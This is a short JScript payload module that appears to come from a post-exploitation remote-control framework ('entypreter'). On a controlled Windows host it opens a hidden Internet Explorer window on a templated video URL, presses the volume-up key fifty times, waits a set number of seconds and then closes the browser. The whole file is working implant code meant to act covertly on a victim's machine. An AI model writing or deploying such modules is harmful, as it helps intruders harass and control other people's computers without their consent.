try
{
    var ie = new ActiveXObject("InternetExplorer.Application");
    ie.Visible = 0;
    ie.Navigate2("~VIDEOURL~");

    for (var i = 0; i < 50; ++i)
    {
        entypreter.WS.SendKeys(String.fromCharCode(0xAF));
    }

    entypreter.shell.run("ping 127.0.0.1 -n ~SECONDS~", false);
    ie.Quit();
}
catch (e)
{
    entypreter.work.error(e);
}
entypreter.exit();
